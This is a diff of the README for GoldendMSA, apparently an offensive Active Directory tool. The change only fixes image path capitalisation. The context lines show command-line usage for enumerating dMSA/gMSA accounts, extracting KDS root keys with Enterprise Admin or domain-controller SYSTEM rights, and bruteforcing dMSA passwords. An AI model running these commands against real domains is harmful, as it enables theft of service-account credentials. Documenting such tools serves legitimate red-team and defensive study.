@@ -46,7 +46,7 @@ Create a wordlist for dMSA's password bruteforcing:
 ```
 $ GoldendMSA.exe wordlist -s <dMSA's sid> -d <dMSA's domain> -f <forest's domain> -k <id of kds root key>
 ```
-![image](Assets/Wordlist.jpg)
+![image](assets/Wordlist.jpg)
 
 
 Gathers info on dMSAs/gMSAs based on ldap or RID enumeration:
@@ -55,7 +55,7 @@ $ GoldendMSA.exe info -d <domain name> -m ldap
 $ GoldendMSA.exe info -d <domain name> -m brute -u <username> -p <password> -o <user's domain name> -s <gMSA's sid>
 $ GoldendMSA.exe info -d <domain name> -m brute -u <username> -p <password> -o <user's domain name> -r <number>
 ```
-![image](Assets/Info.jpg)
+![image](assets/Info.jpg)
 
 
 Gathers info on KDS root keys (requires Enterprise admins permissions):
@@ -63,7 +63,7 @@ Gathers info on KDS root keys (requires Enterprise admins permissions):
 $ GoldendMSA.exe kds
 $ GoldendMSA.exe kds -g <guid of KDS root key>
 ```
-![image](Assets/Kds.jpg)
+![image](assets/Kds.jpg)
 
 
 Gathers info on KDS root keys (requires SYSTEM permissions on a DC):
@@ -76,7 +76,7 @@ Bruteforce dMSA's password:
 $ GoldendMSA.exe bruteforce -s <sid of dmsa> -i <kds root key id> -k <kds root key> -d <dmsa's domain> -u <dmsa (should end with $)> -t
 $ GoldendMSA.exe bruteforce -s <sid of dmsa> -i <kds root key id> -k <kds root key> -d <dmsa's domain> -u <dmsa (should end with $)> -v
 ```
-![image](Assets/Bruteforce.jpg)
+![image](assets/Bruteforce.jpg)
 
 ## License
 
